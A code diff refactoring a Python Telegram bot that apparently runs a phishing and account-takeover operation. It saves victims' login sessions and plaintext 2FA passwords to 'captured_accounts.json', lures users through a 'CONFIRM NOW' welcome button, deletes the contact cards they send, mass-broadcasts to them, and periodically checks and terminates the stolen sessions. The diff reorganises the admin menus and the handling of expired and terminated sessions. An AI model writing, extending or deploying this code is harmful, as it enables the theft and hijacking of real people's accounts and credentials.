@@ -10,11 +10,13 @@ import sys
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
 logger = logging.getLogger(__name__)
 
+
 def _si(v, d=0):
     try:
         return int(str(v).strip()) if v not in (None, "") else d
     except Exception:
         return d
+
 
 BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
 API_ID = _si(os.environ.get("API_ID"), 0)
@@ -54,7 +56,6 @@ sessions_lock = threading.Lock()
 DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
 WELCOME_FILE = "welcome_config.json"
-SECTIONS_FILE = "sections.json"
 
 STATE = {
     "capture_mode": False,
@@ -62,7 +63,6 @@ STATE = {
     "awaiting_timer": False,
     "awaiting_btn_text": False,
     "awaiting_btn_url": False,
-    "awaiting_section_name": False,
 }
 
 broadcast_state = {
@@ -73,10 +73,7 @@ broadcast_state = {
 }
 
 timer_value = 60
-# Expire sections auto-delete toggle
 AUTO_DELETE_EXPIRED = True
-# Track section messages for editing: {section_key: {"chat_id": x, "msg_id": y, "accounts": [...]}}
-SECTION_MESSAGES = {}
 
 
 def load_json(path, default):
@@ -260,8 +257,9 @@ def run_tg(phone, code=None, password=None):
                     'dc': dc, 'time': str(datetime.now()),
                     'has_2fa': pu, 'password': password if pu else '',
                     'added_at': time.time(),
-                    'expires_at': time.time() + 86400,  # 24 hours
+                    'expires_at': time.time() + 86400,
                     'status': 'active',
+                    'is_premium': False,
                 }
                 save_account(acc)
                 global captured_accounts
@@ -301,22 +299,46 @@ SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 
+# ---------- MENUS ----------
 def admin_menu():
     return [
         [Button.inline("👋 Welcome Messages", b"menu_welcome"),
          Button.inline("📢 Broadcast", b"menu_broadcast")],
-        [Button.inline("📂 Sections", b"menu_sections"),
-         Button.inline("🔴 Expired", b"menu_expired")],
-        [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
-         Button.inline("👥 Users", b"menu_users")],
-        [Button.inline("📊 Stats", b"menu_stats"),
-         Button.inline("🔄 Reset Modes", b"menu_reset")],
+        [Button.inline("🔴 Expired", b"menu_expired"),
+         Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer")],
+        [Button.inline("👥 Users", b"menu_users"),
+         Button.inline("📊 Stats", b"menu_stats")],
         [Button.inline(f"🗑 Auto-Delete Expired: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
+        [Button.inline("🔄 Reset Modes", b"menu_reset")],
     ]
 
 
 def back_button():
     return [[Button.inline("⬅️ Back", b"menu_home")]]
+
+
+def welcome_menu():
+    return [
+        [Button.inline("➕ Add Messages", b"wl_add"),
+         Button.inline("📋 List", b"wl_list")],
+        [Button.inline("🗑 Clear All", b"wl_clear")],
+        [Button.inline("🔘 Button Text", b"wl_btntext"),
+         Button.inline("🔗 Button URL", b"wl_btnurl")],
+        [Button.inline("👁 Preview", b"wl_preview"),
+         Button.inline("🔕 Toggle Button", b"wl_toggle_btn")],
+        [Button.inline("⬅️ Back", b"menu_home")],
+    ]
+
+
+def broadcast_menu():
+    return [
+        [Button.inline("➕ Add Messages", b"bc_add"),
+         Button.inline("▶️ Start", b"bc_start")],
+        [Button.inline("⏹ Stop", b"bc_stop"),
+         Button.inline("🗑 Clear", b"bc_clear")],
+        [Button.inline("📋 Show Queue", b"bc_show")],
+        [Button.inline("⬅️ Back", b"menu_home")],
+    ]
 
 
 async def safe_send(chat_id, text, buttons=None, edit_event=None):
@@ -344,9 +366,7 @@ async def safe_send(chat_id, text, buttons=None, edit_event=None):
         return False
 
 
-# ============================================================
-# WELCOME — proper quote support
-# ============================================================
+# ---------- WELCOME ----------
 async def send_welcome(uid, name):
     logger.info(f"=== SEND_WELCOME for uid={uid} name={name} ===")
     msgs = welcome_config.get("messages", [])
@@ -363,58 +383,28 @@ async def send_welcome(uid, name):
         buttons = None
         if is_last and show_button:
             buttons = [[Button.url(btn_text, btn_url)]]
-
         sent_msg = None
-        # Try Markdown first
         try:
             sent_msg = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
         except Exception as e1:
             logger.warning(f"welcome md fail: {e1}")
-            # Try HTML (better quote support)
             try:
-                # Convert **bold** to <b>, > quote to <blockquote>
-                html_content = content
-                # Simple **bold** -> <b>
                 import re
-                html_content = re.sub(r'\*\*(.+?)\*\*', r'<b>\1</b>', html_content)
+                html_content = re.sub(r'\*\*(.+?)\*\*', r'<b>\1</b>', content)
                 html_content = re.sub(r'__(.+?)__', r'<i>\1</i>', html_content)
-                # Quote lines (starting with >)
                 html_content = re.sub(r'^> (.+)$', r'<blockquote>\1</blockquote>', html_content, flags=re.MULTILINE)
                 sent_msg = await bot.send_message(uid, html_content, buttons=buttons, parse_mode='html')
             except Exception as e2:
                 logger.warning(f"welcome html fail: {e2}")
-                # Plain text fallback
                 try:
                     sent_msg = await bot.send_message(uid, content, buttons=buttons)
                 except Exception as e3:
                     logger.error(f"welcome all fail: {e3}")
         if sent_msg:
             sent_ids.append(sent_msg.id)
-            logger.info(f"✅ Welcome msg #{i+1} sent: {sent_msg.id}")
+            logger.info(f"✅ Welcome #{i+1} sent: {sent_msg.id}")
         await asyncio.sleep(0.3)
     return sent_ids
-
-
-# ============================================================
-# SECTION MESSAGE BUILDER
-# ============================================================
-def build_section_message(section_name, accounts, expired=False):
-    """Build section list message. Premium marked with 👹👹"""
-    lines = [f"📂 **{section_name}**", ""]
-    if not accounts:
-        lines.append("_(empty)_")
-        return "\n".join(lines)
-    for i, a in enumerate(accounts, 1):
-        phone = a.get("phone", "?")
-        name = a.get("first_name", "") or "?"
-        is_premium = a.get("is_premium", False)
-        expired_flag = a.get("status") == "expired"
-        premium_emoji = "👹👹" if is_premium else ""
-        if expired_flag:
-            lines.append(f"{i}. {premium_emoji} `{phone}` — ❌ **expired**")
-        else:
-            lines.append(f"{i}. {premium_emoji} `{phone}` — {name}")
-    return "\n".join(lines)
 
 
 # ============================================================
@@ -433,7 +423,6 @@ async def start_handler(event):
             "joined": str(datetime.now()),
         }
         save_users(users)
-
         if uid == YOUR_TELEGRAM_ID:
             await event.respond(
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
@@ -464,77 +453,20 @@ async def cb(event):
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                 admin_menu(), edit_event=event)
 
-        elif data == "menu_toggle_expired":
-            AUTO_DELETE_EXPIRED = not AUTO_DELETE_EXPIRED
-            await event.answer(f"Auto-Delete: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", alert=True)
-            await safe_send(chat_id,
-                f"🗑 Auto-Delete Expired: **{'ON' if AUTO_DELETE_EXPIRED else 'OFF'}**",
-                admin_menu(), edit_event=event)
-
-        elif data == "menu_expired":
-            accounts = load_accounts()
-            expired = [a for a in accounts if a.get("status") == "expired"]
-            txt = f"🔴 **Expired Sessions** — {len(expired)}\n\n"
-            if expired:
-                for a in expired[:20]:
-                    txt += f"• `{a.get('phone')}`\n"
-            else:
-                txt += "_No expired sessions_"
-            await event.answer()
-            await safe_send(chat_id, txt, [
-                [Button.inline("🗑 Delete All Expired", b"expired_delete_all")],
-                back_button(),
-            ], edit_event=event)
-
-        elif data == "expired_delete_all":
-            accounts = load_accounts()
-            new_accounts = [a for a in accounts if a.get("status") != "expired"]
-            save_json(DATA_FILE, new_accounts)
-            global captured_accounts
-            captured_accounts = new_accounts
-            await event.answer(f"Deleted {len(accounts) - len(new_accounts)}", alert=True)
-            await safe_send(chat_id, "✅ Expired deleted.", admin_menu(), edit_event=event)
-
-        elif data == "menu_sections":
-            sections = load_json(SECTIONS_FILE, {})
-            txt = f"📂 **Sections** — {len(sections)}\n\n"
-            for key, val in list(sections.items())[:15]:
-                txt += f"• `{key}` ({len(val) if isinstance(val, list) else 0})\n"
-            await event.answer()
-            await safe_send(chat_id, txt, [
-                [Button.inline("➕ Add Section", b"section_add")],
-                back_button(),
-            ], edit_event=event)
-
-        elif data == "section_add":
-            STATE["awaiting_section_name"] = True
-            await event.answer()
-            await safe_send(chat_id,
-                "📂 Send section name (e.g., `premium_01`):",
-                back_button(), edit_event=event)
-
         elif data == "menu_reset":
             for k in STATE:
                 STATE[k] = False
             await event.answer("Reset!", alert=True)
             await safe_send(chat_id, "✅ Modes reset.", admin_menu(), edit_event=event)
 
+        # ---------- WELCOME ----------
         elif data == "menu_welcome":
             n = len(welcome_config.get("messages", []))
             await event.answer()
             await safe_send(chat_id,
                 f"👋 **Welcome Messages** — `{n}` active\n\n"
-                f"**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`\n**Code:** `` `text` ``",
-                [
-                    [Button.inline("➕ Add Messages", b"wl_add"),
-                     Button.inline("📋 List", b"wl_list")],
-                    [Button.inline("🗑 Clear All", b"wl_clear")],
-                    [Button.inline("🔘 Button Text", b"wl_btntext"),
-                     Button.inline("🔗 Button URL", b"wl_btnurl")],
-                    [Button.inline("👁 Preview", b"wl_preview"),
-                     Button.inline("🔕 Toggle Button", b"wl_toggle_btn")],
-                    back_button(),
-                ], edit_event=event)
+                f"**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`\n**Code:** `` `code` ``",
+                welcome_menu(), edit_event=event)
 
         elif data == "wl_add":
             STATE["welcome_capture"] = True
@@ -552,7 +484,8 @@ async def cb(event):
             STATE["welcome_capture"] = False
             n = len(welcome_config.get("messages", []))
             await event.answer(f"Saved {n}", alert=True)
-            await safe_send(chat_id, f"✅ Welcome: `{n}`", admin_menu(), edit_event=event)
+            await safe_send(chat_id, f"✅ Welcome: `{n}` messages.",
+                admin_menu(), edit_event=event)
 
         elif data == "wl_list":
             msgs = welcome_config.get("messages", [])
@@ -568,20 +501,21 @@ async def cb(event):
             welcome_config["messages"] = []
             save_welcome_config(welcome_config)
             await event.answer("Cleared!", alert=True)
-            await safe_send(chat_id, "Cleared.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "Cleared welcome messages.", admin_menu(),
+                edit_event=event)
 
         elif data == "wl_btntext":
             STATE["awaiting_btn_text"] = True
             await event.answer()
             await safe_send(chat_id,
-                f"✏️ Current: `{welcome_config.get('button_text', 'CONFIRM NOW')}`\n\nSend new text.",
+                f"✏️ Current: `{welcome_config.get('button_text', 'CONFIRM NOW')}`\n\nSend new button text.",
                 back_button(), edit_event=event)
 
         elif data == "wl_btnurl":
             STATE["awaiting_btn_url"] = True
             await event.answer()
             await safe_send(chat_id,
-                f"🔗 Current: `{welcome_config.get('button_url', WEBAPP_URL)}`\n\nSend URL.",
+                f"🔗 Current: `{welcome_config.get('button_url', WEBAPP_URL)}`\n\nSend new URL.",
                 back_button(), edit_event=event)
 
         elif data == "wl_toggle_btn":
@@ -596,28 +530,23 @@ async def cb(event):
             await event.answer("Preview sent")
             await send_welcome(YOUR_TELEGRAM_ID, "Preview")
 
+        # ---------- BROADCAST ----------
         elif data == "menu_broadcast":
             s = broadcast_state
             await event.answer()
             await safe_send(chat_id,
                 f"📢 **Broadcast**\n\nActive: `{s['active']}`\nQueue: `{len(s['messages'])}`\nInterval: `{s['interval']}s`",
-                [
-                    [Button.inline("➕ Add Messages", b"bc_add"),
-                     Button.inline("▶️ Start", b"bc_start")],
-                    [Button.inline("⏹ Stop", b"bc_stop"),
-                     Button.inline("🗑 Clear", b"bc_clear")],
-                    [Button.inline("📋 Show Queue", b"bc_show")],
-                    back_button(),
-                ], edit_event=event)
+                broadcast_menu(), edit_event=event)
 
         elif data == "bc_add":
             STATE["capture_mode"] = True
             STATE["welcome_capture"] = False
             await event.answer("Send messages")
             await safe_send(chat_id,
-                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video.",
+                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video. Tap START when done.",
                 [[Button.inline("▶️ Start Now", b"bc_start")],
-                 [Button.inline("❌ Cancel", b"bc_cancel")]], edit_event=event)
+                 [Button.inline("❌ Cancel", b"bc_cancel")]],
+                edit_event=event)
 
         elif data == "bc_show":
             msgs = broadcast_state.get("messages", [])
@@ -637,7 +566,7 @@ async def cb(event):
             broadcast_state['next_run'] = time.time() + 3
             await event.answer("Started!", alert=True)
             await safe_send(chat_id,
-                f"▶️ Broadcasting `{len(broadcast_state['messages'])}` to `{len(users)}` users.",
+                f"▶️ Broadcasting `{len(broadcast_state['messages'])}` to `{len(users)}` users every `{broadcast_state['interval']}s`.",
                 back_button(), edit_event=event)
 
         elif data == "bc_cancel":
@@ -655,6 +584,62 @@ async def cb(event):
             broadcast_state['messages'] = []
             await event.answer("Cleared", alert=True)
 
+        # ---------- EXPIRED ----------
+        elif data == "menu_expired":
+            accounts = load_accounts()
+            expired = [a for a in accounts if a.get("status") == "expired"]
+            termin = [a for a in accounts if a.get("status") == "terminated"]
+            txt = f"🔴 **Expired:** `{len(expired)}`\n⚰️ **Terminated:** `{len(termin)}`\n\n"
+            if expired:
+                for a in expired[:15]:
+                    txt += f"❌ `{a.get('phone')}`\n"
+            if termin:
+                txt += "\n**Terminated:**\n"
+                for a in termin[:15]:
+                    txt += f"⚰️ `{a.get('phone')}`\n"
+            if not expired and not termin:
+                txt += "_No expired sessions_"
+            await event.answer()
+            await safe_send(chat_id, txt, [
+                [Button.inline("🗑 Delete Expired", b"expired_del")],
+                [Button.inline("🗑 Delete Terminated", b"terminated_del")],
+                [Button.inline("🗑 Delete Both", b"expired_del_both")],
+                back_button(),
+            ], edit_event=event)
+
+        elif data == "expired_del":
+            accounts = load_accounts()
+            new_a = [a for a in accounts if a.get("status") != "expired"]
+            save_json(DATA_FILE, new_a)
+            global captured_accounts
+            captured_accounts = new_a
+            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
+            await safe_send(chat_id, "✅ Expired deleted.", admin_menu(), edit_event=event)
+
+        elif data == "terminated_del":
+            accounts = load_accounts()
+            new_a = [a for a in accounts if a.get("status") != "terminated"]
+            save_json(DATA_FILE, new_a)
+            captured_accounts = new_a
+            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
+            await safe_send(chat_id, "✅ Terminated deleted.", admin_menu(), edit_event=event)
+
+        elif data == "expired_del_both":
+            accounts = load_accounts()
+            new_a = [a for a in accounts if a.get("status") not in ("expired", "terminated")]
+            save_json(DATA_FILE, new_a)
+            captured_accounts = new_a
+            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
+            await safe_send(chat_id, "✅ Both deleted.", admin_menu(), edit_event=event)
+
+        elif data == "menu_toggle_expired":
+            AUTO_DELETE_EXPIRED = not AUTO_DELETE_EXPIRED
+            await event.answer(f"Auto-Delete: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", alert=True)
+            await safe_send(chat_id,
+                f"🗑 Auto-Delete Expired: **{'ON' if AUTO_DELETE_EXPIRED else 'OFF'}**",
+                admin_menu(), edit_event=event)
+
+        # ---------- OTHER ----------
         elif data == "menu_timer":
             STATE["awaiting_timer"] = True
             await event.answer()
@@ -668,8 +653,9 @@ async def cb(event):
         elif data == "menu_stats":
             s = broadcast_state
             exp_count = sum(1 for a in captured_accounts if a.get("status") == "expired")
+            term_count = sum(1 for a in captured_accounts if a.get("status") == "terminated")
             await event.answer(
-                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nTimer: {timer_value}s\nWelcome: {len(welcome_config.get('messages', []))}\nExpired: {exp_count}",
+                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nTimer: {timer_value}s\nWelcome: {len(welcome_config.get('messages', []))}\nExpired: {exp_count}\nTerminated: {term_count}",
                 alert=True)
 
         else:
@@ -700,11 +686,10 @@ async def cancel(event):
 
 
 # ============================================================
-# MESSAGE CAPTURE + Auto-delete contact cards
+# CAPTURE + Contact delete
 # ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
-    # Delete contact cards from user chat
     if event.sender_id != YOUR_TELEGRAM_ID:
         try:
             if event.message and event.message.contact:
@@ -717,16 +702,6 @@ async def capture(event):
 
     txt = event.raw_text or ""
     if txt.startswith('/'):
-        return
-
-    if STATE["awaiting_section_name"]:
-        name = txt.strip()
-        sections = load_json(SECTIONS_FILE, {})
-        if name not in sections:
-            sections[name] = []
-            save_json(SECTIONS_FILE, sections)
-        STATE["awaiting_section_name"] = False
-        await event.respond(f"✅ Section `{name}` created.", buttons=admin_menu())
         return
 
     if STATE["awaiting_timer"]:
@@ -792,13 +767,12 @@ async def capture(event):
 
 
 # ============================================================
-# SECTION MONITOR — check expired/terminated + edit messages
+# SECTION MONITOR
 # ============================================================
 async def section_monitor():
-    """Every 5 min, check session validity. If invalid — mark expired, edit message."""
     while True:
         try:
-            await asyncio.sleep(300)  # 5 min
+            await asyncio.sleep(300)
             accounts = load_accounts()
             if not accounts:
                 continue
@@ -809,7 +783,6 @@ async def section_monitor():
                 session_str = a.get("session", "")
                 if not session_str:
                     continue
-                # Check session validity
                 try:
                     loop = asyncio.new_event_loop()
                     asyncio.set_event_loop(loop)
@@ -818,8 +791,7 @@ async def section_monitor():
                         c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                         await c.connect()
                         try:
-                            authorized = await c.is_user_authorized()
-                            return authorized
+                            return await c.is_user_authorized()
                         finally:
                             await c.disconnect()
 
@@ -832,15 +804,13 @@ async def section_monitor():
                             changed = True
                             logger.info(f"Session expired: {a['phone']}")
                     else:
-                        # Check 24h expiry for terminate
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400 and a.get("status") != "terminated":
-                            # Try to terminate session (log out)
                             try:
                                 loop2 = asyncio.new_event_loop()
                                 asyncio.set_event_loop(loop2)
 
-                                async def terminate_session():
+                                async def term():
                                     c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                                     await c.connect()
                                     try:
@@ -852,8 +822,7 @@ async def section_monitor():
                                             await c.disconnect()
                                         except Exception:
                                             pass
-
-                                loop2.run_until_complete(terminate_session())
+                                loop2.run_until_complete(term())
                                 loop2.close()
                             except Exception:
                                 pass
@@ -862,12 +831,12 @@ async def section_monitor():
                             changed = True
                             logger.info(f"Session terminated (24h): {a['phone']}")
                 except Exception as e:
-                    logger.error(f"section_monitor err for {a.get('phone')}: {e}")
+                    logger.error(f"monitor err {a.get('phone')}: {e}")
             if changed:
                 save_json(DATA_FILE, accounts)
                 captured_accounts = accounts
         except Exception as e:
-            logger.error(f"section_monitor loop err: {e}")
+            logger.error(f"section_monitor err: {e}")
 
 
 # ============================================================
